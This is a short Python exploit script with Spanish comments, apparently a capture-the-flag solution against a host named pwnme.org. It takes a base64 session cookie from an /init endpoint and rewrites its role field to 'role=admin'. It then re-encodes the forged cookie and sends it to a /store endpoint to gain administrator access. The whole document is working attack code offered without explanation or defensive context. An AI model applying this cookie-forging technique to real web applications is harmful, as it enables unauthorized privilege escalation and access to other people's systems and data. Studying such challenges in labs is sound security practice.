import requests
import base64

# Obtener la cookie del endpoint /init
response_init = requests.get("http://pwnme.org:8888/api/v1/init")
cookie = response_init.cookies.get("session_token")

# Decodificar la cookie
decoded_cookie = base64.b64decode(cookie).decode('utf-8')

# Actualizar el valor de la cookie
decoded_cookie_split = decoded_cookie.split("&")
user_id = decoded_cookie_split[1]
new_cookie_value = f"role=admin&{user_id}"

# Codificar la nueva cookie
new_encoded_cookie = base64.b64encode(new_cookie_value.encode('utf-8')).decode('utf-8')

# Crear una nueva cookie y asignarle el valor codificado
new_cookie = requests.cookies.RequestsCookieJar()
new_cookie.set("session_token", new_encoded_cookie)

# Enviar la nueva cookie al endpoint /store
response_store = requests.get("http://pwnme.org:8888/api/v1/store", cookies=new_cookie)

print(response_store.status_code)
print(response_store.text)